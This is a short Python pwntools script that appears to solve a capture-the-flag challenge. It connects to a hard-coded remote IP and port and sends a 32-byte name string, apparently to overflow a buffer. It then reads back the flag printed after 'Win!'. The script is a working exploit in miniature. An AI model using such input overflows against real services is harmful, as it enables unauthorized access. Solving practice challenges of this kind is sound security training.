from pwn import *


def solve():
    io = remote('35.200.120.35', 9001)

    for _ in range(3):
        io.sendline()
    io.sendlineafter(b'Input name:', b'a' * 32)

    for _ in range(5):
        io.sendline()

    io.recvuntil(b'Win!\n')
    flag = io.recvline().decode()
    io.close()

    return flag


if __name__ == '__main__':
    print(solve())
